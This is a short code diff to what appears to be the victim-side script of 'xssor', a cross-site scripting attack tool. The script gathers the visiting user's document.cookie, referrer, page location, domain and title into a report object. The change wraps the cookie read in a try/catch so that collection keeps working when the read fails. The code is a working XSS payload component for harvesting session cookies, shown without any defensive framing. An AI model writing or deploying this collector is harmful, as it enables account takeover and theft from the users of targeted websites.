@@ -35,7 +35,11 @@ xssor.info.pid = 'abcdefg';
 xssor.info.referrer = document.referrer;
 xssor.info.location = window.location.href;
 xssor.info.toplocation = top.location.href;
-xssor.info.cookie = document.cookie;
+try {
+    xssor.info.cookie = document.cookie;
+} catch(error) {
+    xssor.info.cookie = "-";
+};
 xssor.info.domain = document.domain;
 xssor.info.title = document.title;
 xssor.info.charset = document.characterSet ? document.characterSet : document.charset;
